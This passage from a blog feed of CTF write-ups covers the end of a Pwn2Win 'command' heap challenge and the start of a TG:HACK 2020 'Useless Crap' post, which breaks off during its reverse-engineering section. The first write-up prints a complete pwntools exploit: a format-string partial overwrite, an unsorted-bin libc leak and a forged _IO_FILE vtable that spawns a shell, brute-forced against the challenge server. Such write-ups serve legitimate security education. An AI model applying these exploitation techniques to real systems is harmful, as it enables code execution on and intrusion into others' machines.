&lt;p&gt;First, the function checks if the user has already supplied 10 commands which is the maximum number of allowed inputs at the same time. Then it allocates &lt;code&gt;0x188&lt;/code&gt; chunk through &lt;code&gt;malloc&lt;/code&gt; function and it reads 4 bytes input followed by a command string finally stores them in the parameter array &lt;code&gt;a1&lt;/code&gt; which is a &lt;code&gt;command&lt;/code&gt;s array.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Command&lt;/code&gt; is a structure designed as follow:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct commands{
    long long priority;
    char command[0x170];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;review_command-function&#34;&gt;Review_command function&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;__int64 __fastcall review_command(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf(&amp;quot;Command index: &amp;quot;);
  result = read_long_int();
  v2 = result;
  if ( (int)result &amp;gt;= 0 &amp;amp;&amp;amp; (int)result &amp;lt;= 9 )
  {
    result = *(_QWORD *)(8LL * (int)result + a1);
    if ( result )
    {
      puts(&amp;amp;byte_15FA);
      result = display_command(*(_QWORD *)(8LL * v2 + a1));
    }
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The function reads an index from the user then it checks if the index given points to an allocated command structure in order to prevent Use After Free. If it&amp;rsquo;s the case it displays the priority along side with the command string.&lt;/p&gt;
&lt;h5 id=&#34;delete_command-function&#34;&gt;Delete_command function&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __fastcall delete_command(__int64 a1)
{
  __int64 v1; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  printf(&amp;quot;Command index: &amp;quot;);
  LODWORD(v1) = read_long_int();
  v3 = v1;
  if ( (int)v1 &amp;gt;= 0 &amp;amp;&amp;amp; (int)v1 &amp;lt;= 9 )
  {
    v1 = *(_QWORD *)(8LL * (int)v1 + a1);
    if ( v1 )
    {
      free(*(void **)(8LL * v3 + a1));
      *(_QWORD *)(8LL * v3 + a1) = 0LL;
      LODWORD(v1) = puts(&amp;quot;The command has been successfully deleted&amp;quot;);
    }
  }
  return v1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The function reads an index from the user, it checks if the index given points to a valid command structure. If it&amp;rsquo;s the case it will free the correspondent chunk and null the pointer in &lt;code&gt;a1&lt;/code&gt; array in order to prevent the Double Free.&lt;/p&gt;
&lt;h5 id=&#34;list_command-function&#34;&gt;List_command function&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;__int64 __fastcall list_commands(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i &amp;lt;= 9; ++i )
  {
    result = *(_QWORD *)(8LL * i + a1);
    if ( result )
    {
      puts(&amp;amp;byte_15FA);
      printf(&amp;quot;Index %d\n&amp;quot;, (unsigned int)i);
      result = display_command(*(_QWORD *)(8LL * i + a1));
    }
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the function just iterates over &lt;code&gt;a1&lt;/code&gt; array and displays the different allocated commands.&lt;/p&gt;
&lt;p&gt;the 5th choice just returns to the main function.&lt;/p&gt;
&lt;p&gt;After the function &lt;code&gt;manage_commands&lt;/code&gt; returns, it creates a file then it executes the &lt;code&gt;send_commands&lt;/code&gt; function.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;unsigned __int64 __fastcall send_command(__int64 a1, FILE **a2)
{
  int i; // [rsp+14h] [rbp-3Ch]
  __int64 v4; // [rsp+18h] [rbp-38h]
  char src; // [rsp+20h] [rbp-30h]
  char s; // [rsp+30h] [rbp-20h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  memset(&amp;amp;s, 0, 0x14uLL);
  memset(&amp;amp;src, 0, 0x10uLL);
  puts(&amp;quot;Are you sending the commands to which rbs?&amp;quot;);
  v4 = (int)read_long_int();
  fprintf(*a2, &amp;quot;Id: %lld\n&amp;quot;, v4);
  for ( i = 0; i &amp;lt;= 9; ++i )
  {
    if ( *(_QWORD *)(8LL * i + a1) )
      fprintf(*a2, &amp;quot;%lld:%s\n&amp;quot;, **(_QWORD **)(8LL * i + a1), *(_QWORD *)(8LL * i + a1) + 8LL);
  }
  snprintf(&amp;amp;src, 0xCuLL, buf);
  strcpy(&amp;amp;s, &amp;quot;Mr. &amp;quot;);
  strcat(&amp;amp;s, &amp;amp;src);
  printf(&amp;quot;You command %s!\n&amp;quot;, &amp;amp;s);
  return __readfsqword(0x28u) ^ v7;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The function reads a 4 bytes long long and then just stores the different commands into the opened file. After that, it calls &lt;code&gt;snprintf&lt;/code&gt; without the format parameter which leads to a format string vulnerability but with a very limited number of chars 0xC. since we control the parameter buf which the name supplied in the first step.&lt;/p&gt;
&lt;p&gt;Then it concatenates the name with the string &amp;ldquo;Mr. &amp;quot; and prints the final message to the &lt;code&gt;stdout&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Finally, it returns to the main function and calls &lt;code&gt;fclose()&lt;/code&gt; before exiting.&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;We start by implementing the wrappers needed to communicate with the binary.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from pwn import log as Log
from time import sleep

def log(title,value):
    Log.info(title + &amp;quot;: {} &amp;quot;.format(hex(value)))
period = 0.2

def include(priority,command):
    p.sendline(&amp;quot;1&amp;quot;)
    p.recv(8000)
    p.sendline(str(priority))
    p.recv(8000)
    p.send(command)
    sleep(period)
    p.recv(8000)

def review(index):
    p.sendline(&amp;quot;2&amp;quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recvuntil(&amp;quot;Command: &amp;quot;)
    data = p.recvline().strip()
    p.recv(8000)
    return data

def delete(index):
    p.sendline(&amp;quot;3&amp;quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def init(name):
    p.sendline(name)
    p.recv(8000)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;leaking-libc-address&#34;&gt;Leaking Libc address&lt;/h4&gt;
&lt;p&gt;Since it allocates 0x188 bytes, which is lower then 0x408, which is the maximum size that a tcache bin can hold.
because of that the first 7 freed chunks will go to tcache bin and  the next one will go to the unsorted bin and since the unsorted bin is a doubly linked list we can leak &lt;b&gt;BK&lt;/b&gt; pointer if we can provide and empty command string through the following steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Allocates a chunk&lt;/p&gt;
&lt;p&gt;first state of the chunk&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/allocated.png&#34; alt=&#34;Allocated Chunk&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Freed chunk&lt;/p&gt;
&lt;p&gt;The state of the freed chunk that goes to unsorted bin&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/freed.png&#34; alt=&#34;Freed Chunk&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Reallocated chunk&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/leaked.png&#34; alt=&#34;Reallocated Chunk&#34;&gt;&lt;/p&gt;
&lt;p&gt;when we reallocate the freed chunk that is stored in the unsorted bin, if we can provide an empty input as a command string as shown in the 3rd diagram we can persist the state of &lt;b&gt;BK&lt;/b&gt; pointer in the same place as command string and it can be displayed through &lt;code&gt;review_command&lt;/code&gt; function ==&amp;gt; Libc Leak \o/ !&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;    p=process(&amp;quot;./command&amp;quot;)
    p.recv(8000)
    payload = &amp;quot;&amp;quot;
    payload += &amp;quot;RANDOM_NAME&amp;quot;
    init(payload)
    #allocates 9 chunks (7 tcache + 1 in order to prevent consolidating with top chunk + 1 to unsorted bin)
    for i in range(9):
        include(123,&amp;quot;abc&amp;quot;)
    #frees 8 chunks ( 7 tcache + 1 unsorted)
    for i in range(8):
        delete(i)
 # allocates 7 chunks to empty tcache since it has the allocation priority 
    for i in range(7):
        include(123,chr(65+i)*3)
    #this chunk allocated from unsorted bin
    include(123,&amp;quot;a&amp;quot;)
 #Will be explained below
    data = review(7)
    leak = u64(data.ljust(8,&amp;quot;\x00&amp;quot;))
    leak = leak &amp;amp; 0xffffffffffffff00
    leak = leak | 0xa0
    log(&amp;quot;leak&amp;quot;,leak)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since we couldn&amp;rsquo;t send an empty string to the binary as command text we decided to make one byte overwrite on the &lt;b&gt;BK&lt;/b&gt; pointer and because the &lt;b&gt;LSB&lt;/b&gt; of the main arena stored is always 0xa0 for the challenge&amp;rsquo;s libc provided (2.27)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ python solver.py 
[+] Starting local process &#39;./command&#39;: pid 24613
[*] leak: 0x7fb4a343aca0 
[*] Switching to interactive mode
$
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;getting-shell&#34;&gt;Getting Shell&lt;/h4&gt;
&lt;p&gt;In the &lt;code&gt;send_command&lt;/code&gt; function after opening the file for writing the different commands provided, it calls &lt;code&gt;snprintf&lt;/code&gt; with a format string vulnerability with the provided name as a parameter.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;   0x557573c5134d:    mov    esi,0xc
   0x557573c51352:    mov    rdi,rax
   0x557573c51355:    mov    eax,0x0
=&amp;gt; 0x557573c5135a:    call   0x557573c50a70 &amp;lt;snprintf@plt&amp;gt;
   0x557573c5135f:    lea    rax,[rbp-0x20]
   0x557573c51363:    mov    DWORD PTR [rax],0x202e724d
   0x557573c51369:    mov    BYTE PTR [rax+0x4],0x0
   0x557573c5136d:    lea    rdx,[rbp-0x30]
Guessed arguments:
arg[0]: 0x7ffd4bcac690 --&amp;gt; 0x0 
arg[1]: 0xc (&#39;\x0c&#39;)
arg[2]: 0x557573e52060 (&amp;quot;YOUR_NAME&amp;quot;)
[------------------------------------stack-------------------------------------]
0000| 0x7ffd4bcac670 --&amp;gt; 0x7ffd4bcac6d0 --&amp;gt; 0x557574364200 --&amp;gt; 0xfbad2c84 
0008| 0x7ffd4bcac678 --&amp;gt; 0x7ffd4bcac6e0 --&amp;gt; 0x557574363260 --&amp;gt; 0x7b (&#39;{&#39;)
0016| 0x7ffd4bcac680 --&amp;gt; 0xa73e52080 
0024| 0x7ffd4bcac688 --&amp;gt; 0x0 
0032| 0x7ffd4bcac690 --&amp;gt; 0x0 
0040| 0x7ffd4bcac698 --&amp;gt; 0x0 
0048| 0x7ffd4bcac6a0 --&amp;gt; 0x0 
0056| 0x7ffd4bcac6a8 --&amp;gt; 0x0 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As shown in the gdb context above, the top of the stack contains a pointer on the &lt;code&gt;_IO_FILE_plus&lt;/code&gt; structure for the opened file.&lt;/p&gt;
&lt;p&gt;So the idea is, if we manage to overwrite that pointer in order to point to our fake file structure. This will allow us to hijack the vtable pointer. From there we can redirect the code execution when the binary calls &lt;code&gt;fclose()&lt;/code&gt; and since the &lt;code&gt;snprintf&lt;/code&gt; juste use 12 bytes only as length, this make it harder for us to full control the pointer on the stack.&lt;/p&gt;
&lt;p&gt;To bypass this limitation, since the structure is located at the heap we need only to partially overwrite the pointer to make it point to our controlled data.&lt;/p&gt;
&lt;h5 id=&#34;fake-file-structure&#34;&gt;Fake File Structure&lt;/h5&gt;
&lt;p&gt;The provided libc version is higher then 2.23 which make the assertion of the vtable pointer inside &lt;code&gt;_libc_IO_vtables&lt;/code&gt; section.
the default File structure is as the following (stderr example) :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;$2 = {
  file = {
    _flags = 0xfbad2087, 
    _IO_read_ptr = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_read_end = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_read_base = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_write_base = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_write_ptr = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_write_end = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_buf_base = 0x7f9470711703 &amp;lt;_IO_2_1_stderr_+131&amp;gt; &amp;quot;&amp;quot;, 
    _IO_buf_end = 0x7f9470711704 &amp;lt;_IO_2_1_stderr_+132&amp;gt; &amp;quot;&amp;quot;, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7f9470711760 &amp;lt;_IO_2_1_stdout_&amp;gt;, 
    _fileno = 0x2, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = &amp;quot;&amp;quot;, 
    _lock = 0x7f94707128b0 &amp;lt;_IO_stdfile_2_lock&amp;gt;, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7f9470710780 &amp;lt;_IO_wide_data_2&amp;gt;, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = &#39;\000&#39; &amp;lt;repeats 19 times&amp;gt;
  }, 
  vtable = 0x7f947070d2a0 &amp;lt;_IO_file_jumps&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;our goal is to construct a similar structure inside the heap and overwrite the file pointer to point to our Fake file. In that way when calling &lt;code&gt;fclose()&lt;/code&gt; the program will call our controlled &lt;code&gt;vtable&lt;/code&gt; address.&lt;/p&gt;
&lt;p&gt;We shall overwrite the &lt;code&gt;vtable&lt;/code&gt; in such a manner so that instead of calling the regular FILE associated function, &lt;code&gt;_IO_str_overflow&lt;/code&gt; would be called. Since we can already forge &lt;code&gt;file pointer&lt;/code&gt;, we can control the execution flow with one_gadget call.&lt;/p&gt;
&lt;p&gt;For deep diving into File Structure Exploitation, here is a useful 
&lt;a href=&#34;https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;link&lt;/a&gt; that describes well the exploitation process.&lt;/p&gt;
&lt;p&gt;If we manage to overwrite by one byte the pointer located into the stack, we fall into our controlled data but due to size limitation we can&amp;rsquo;t fully write our fake file structure which has size 192 without overflowing the next chunk (Default File chunk) which is not the case (no overflow for us). so we don&amp;rsquo;t have choices but overwriting two bytes with null byte. but this will just make the pointer points to the area before the heap which we don&amp;rsquo;t control :( !&lt;/p&gt;
&lt;p&gt;we came up with a clever workaround by just making 10 allocations to make the heap size higher then 0x1000 and by any chance (brute force FTW) if the heap base just ends with 0x#f000 then when nulling the last two bytes of the pointer we fall into 2 controlled chunks (&lt;code&gt;# : any random byte&lt;/code&gt;) because of the default File pointer ends with 0x*0200. (&lt;code&gt;  * = # + 1&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;So final idea is to divide the fake File structure between two controlled chunks and taking consideration of the 2nd chunk metadata.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;    fake1=&amp;quot;&amp;quot;
    fake1+=p64(0xfbad2400) #flags
    fake1+=p64(0)*8
    fake1+=p64(0)*2

    fake2=p64(_IO_lock)*3 #to avoide siegsegv
    fake2+=p64(0xffffffffffffffff)
    fake2+=p64(0)
    fake2+=p64(0)
    fake2+=p64(0)*6
    fake2+=p64(str_overflow-136) #points to str_overflow
    fake2+=p64(one_gadget) #(char *) (*((_IO_strfile *) fp)-&amp;gt;_s._allocate_buffer) (new_size);

    for i in range(10):
        delete(i)

    for i in range(8):
        include(123,&amp;quot;A&amp;quot;*5)

    include(0,&amp;quot;A&amp;quot;*280+fake1) #1st part
    include(0,fake2) #2nd part
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The final exploit is here \o/ !&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from pwn import log as Log
from time import sleep


def log(title,value):
    Log.info(title + &amp;quot;: {} &amp;quot;.format(hex(value)))
period = 0.2

def include(priority,command):
    p.sendline(&amp;quot;1&amp;quot;)
    p.recv(8000)
    p.sendline(str(priority))
    p.recv(8000)
    p.send(command)
    sleep(period)
    p.recv(8000)


def review(index):
    p.sendline(&amp;quot;2&amp;quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recvuntil(&amp;quot;Command: &amp;quot;)
    data = p.recvline().strip()
    p.recv(8000)
    return data

def delete(index):
    p.sendline(&amp;quot;3&amp;quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def init(name):
    p.sendline(name)
    p.recv(8000)


for _ in range(100):
    #p = process(&amp;quot;./command&amp;quot;)
    p=remote(&amp;quot;command.pwn2.win&amp;quot;,1337)
    p.recv(8000)
    payload = &amp;quot;&amp;quot;
    payload += &amp;quot;%4$hn&amp;quot;
    init(payload)

    for i in range(9):
        include(123,&amp;quot;abc&amp;quot;)
    for i in range(8):
        delete(i)

    for i in range(7):
        include(123,chr(65+i)*3)

    include(123,&amp;quot;a&amp;quot;)

    data = review(7)
    leak = u64(data.ljust(8,&amp;quot;\x00&amp;quot;))
    leak = leak &amp;amp; 0xffffffffffffff00
    leak = leak | 0xa0
    log(&amp;quot;leak&amp;quot;,leak)
    base = leak - 0x3ebca0
    str_overflow = base + 0x3e8378
    one_gadget = base + 0x4f322
    _IO_lock=base+0x3ed8b0
    log(&amp;quot;base&amp;quot;,base)
    log(&amp;quot;str_overflow&amp;quot;,str_overflow)
    log(&amp;quot;one_gadget&amp;quot;,one_gadget)
    include(123,&amp;quot;KKKKKKKKKKKKK&amp;quot;)

    fake1=&amp;quot;&amp;quot;
    fake1+=p64(0xfbad2400)
    fake1+=p64(0)*8
    fake1+=p64(0)*2

    fake2=p64(_IO_lock)*3
    fake2+=p64(0xffffffffffffffff)
    fake2+=p64(0)
    fake2+=p64(0)
    fake2+=p64(0)*6
    fake2+=p64(str_overflow-136)
    fake2+=p64(one_gadget)

    for i in range(10):
        delete(i)

    for i in range(8):
        include(123,&amp;quot;A&amp;quot;*5)

    include(0,&amp;quot;A&amp;quot;*280+fake1)
    include(0,fake2)
    p.sendline(&amp;quot;5&amp;quot;)
    p.sendline(&amp;quot;1&amp;quot;)
    
    try:
        p.sendline(&amp;quot;id&amp;quot;)
        p.interactive()
    except:
        c=0
    p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And here we go :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/flag_pwn2win.png&#34; alt=&#34;Flag&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TG:HACK 2020   Useless Crap</title>
      <link>/post/tghack-2020-useless-crap/</link>
      <pubDate>Tue, 14 Apr 2020 18:57:44 +0100</pubDate>
      <guid>/post/tghack-2020-useless-crap/</guid>
      <description>&lt;p&gt;​&lt;/p&gt;
&lt;h4 id=&#34;challenge-details&#34;&gt;Challenge Details&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Event&lt;/th&gt;
&lt;th&gt;Challenge&lt;/th&gt;
&lt;th&gt;Category&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;TG:Hack CTF 2020&lt;/td&gt;
&lt;td&gt;Useless Crap&lt;/td&gt;
&lt;td&gt;PWN&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://ctftime.org/event/932&#34;&gt;https://ctftime.org/event/932&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Here&amp;rsquo;s some useless crap for you. The flag is at &lt;span style=&#34;color: white&#34;&gt;/home/crap/flag.txt&lt;/span&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc crap.tghack.no 6001
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or use a mirror closer to you:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&#34;color: white&#34;&gt;nc us.crap.tghack.no 6001&lt;/span&gt; (US)&lt;/li&gt;
&lt;li&gt;&lt;span style=&#34;color: white&#34;&gt;nc asia.crap.tghack.no 6001&lt;/span&gt; (Japan)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&#34;https://storage.googleapis.com/tghack-public/2020/c9eec380b28fb6f57abeeae05b3f65d3/crap&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;crap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&#34;https://storage.googleapis.com/tghack-public/2020/c9eec380b28fb6f57abeeae05b3f65d3/libc-2.31.so&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;libc-2.31.so&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&#34;https://storage.googleapis.com/tghack-public/2020/c9eec380b28fb6f57abeeae05b3f65d3/ld-2.31.so&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ld-2.31.so&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;tldl&#34;&gt;TL;DL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Leak Libc address through unsorted bin chunks UAF&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get infinte arbitary read/write/heap allocations&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Write open/read/write ROP chain after srip of main function using allowed syscalls&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Stack pivot to our ROP chain and read flag.txt&lt;/p&gt;
&lt;p&gt;TGHack 2020 had some challenging PWN tasks, and Useless Crap was one of the hardest that we were able to solve during the CTF with our teammate 
&lt;a href=&#34;https://twitter.com/ThamerBaccouch&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Aracna&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended, our first thought was how to patch the binary to use the provided libc and ld files instead of our system libraries. Because this will make it easier for us when developing our exploit in a way that offsets are the same locally and remotely.&lt;/p&gt;
&lt;p&gt;To make this happen we always patch the binary using the method described at 
&lt;a href=&#34;https://www.ayrx.me/using-a-non-system-libc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Using Non-system Glibc&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mv crap old_crap
$ python patch_binary.py crap libc.so.6 ld-2.31.so new_crap
Current ld.so:
Path: /usr/local/lib/ld-linux-x86-64.so.2

New ld.so:
Path: /home/anisboss/pwn/tg/pwn/crap/patch/ld-2.31.so

Adding RUNPATH:
Path: /home/anisboss/pwn/tg/pwn/crap/patch

Writing new binary new_crap
Please rename /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6 to /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6.

$ ldd new_crap
	linux-vdso.so.1 (0x00007ffd93345000)
	libseccomp.so.2 =&amp;gt; /usr/lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f8b6de51000)
	libc.so.6 =&amp;gt; /home/anisboss/pwn/tg/pwn/crap/patch/libc.so.6 (0x00007f8b6da96000)
	/home/anisboss/pwn/tg/pwn/crap/patch/ld-2.31.so =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8b6eed4000)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As u can see the new binary is linked to the provided libraries instead of the standard system libc/ld. In this way we can start running the binary and developing our exploit in the same environment as the remote server.&lt;/p&gt;
&lt;h2 id=&#34;reverse-engineering&#34;&gt;Reverse Engineering&lt;/h2&gt;
&lt;p&gt;Opening up the binary in IDA, reveals a &lt;strong&gt;seccomp&lt;/strong&gt; filters before starting the main function, which is a filter to block certain syscalls, based on the 
&lt;a href=&#34;https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;syscall number&lt;/a&gt; .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;  scmp_filter_ctx v0 = seccomp_init(0);
  v2 = v0;
  if ( !v0 )
  {
    puts(&amp;quot;seccomp_init() error&amp;quot;);
    exit(1);
  }
  seccomp_rule_add(v0, 2147418112LL, 0LL, 1LL); // read syscall
  seccomp_rule_add(v2, 2147418112LL, 231LL, 0LL); // exit_group syscall
  seccomp_rule_add(v2, 2147418112LL, 1LL, 1LL); // write syscall
  seccomp_rule_add(v2, 2147418112LL, 10LL, 0LL); // mprotect syscall
  seccomp_rule_add(v2, 2147418112LL, 2LL, 0LL); // 	open syscall
  seccomp_rule_add(v2, 2147418112LL, 3LL, 0LL); // close syscall
  if ( seccomp_load(v2) &amp;lt; 0 )
  {
    seccomp_release(v2);
    puts(&amp;quot;seccomp_load() error&amp;quot;);
    exit(1);
  }
  return seccomp_release(v2);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Using 
&lt;a href=&#34;https://github.com/david942j/seccomp-tools&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;seccomp-tools&lt;/a&gt;, we can get the following table&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ seccomp-tools dump ./new_crap
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019
 0006: 0x15 0x0c 0x00 0x00000003  if (A == close) goto 0019
 0007: 0x15 0x0b 0x00 0x0000000a  if (A == mprotect) goto 0019
 0008: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0019
 0009: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0014
 0010: 0x20 0x00 0x00 0x00000014  A = args[0] &amp;gt;&amp;gt; 32
 0011: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0020
 0012: 0x20 0x00 0x00 0x00000010  A = args[0]
 0013: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0019 else goto 0020
 0014: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0020
 0015: 0x20 0x00 0x00 0x00000014  A = args[0] &amp;gt;&amp;gt; 32
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A = args[0]
 0018: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can see that &lt;span style=&#34;color :#dd446b&#34;&gt;execve&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;execveat&lt;/span&gt; are blocked, which means no shell for us, &lt;span style=&#34;color:#dd446b&#34;&gt;fork/vfork/clone&lt;/span&gt; are blocked, so we can&amp;rsquo;t create new processes that are free of these seccomp restrictions.
Our approach is to use ORW (&lt;span style=&#34;color :#dd446b&#34;&gt;open read write&lt;/span&gt;) capabilities but we should keep in mind that at lines &lt;em&gt;11-13&lt;/em&gt;  the program checks the first argument passed to read syscall and verify if it&amp;rsquo;s equal to 0 or not. If it&amp;rsquo;s the case then we will be allowed else the syscall will be blocked which means that we can only read from &lt;span style=&#34;color :#dd446b&#34;&gt;stdin&lt;/span&gt; with same analogy we can write only to &lt;span style=&#34;color :#dd446b&#34;&gt;stdout&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;Now moving to the main function, the program defines two major functions  &lt;span style=&#34;color :#dd446b&#34;&gt;do_read()&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;do_write()&lt;/span&gt; which are made for arbitrary 8 bytes read/write . this functions can be called only twice but this will be bypassed later.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// read from arbitrary address
__int64 do_read()
{
  __int64 *v1; // [sp+8h] [bp-18h]@3
  __int64 v2; // [sp+10h] [bp-10h]@3
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
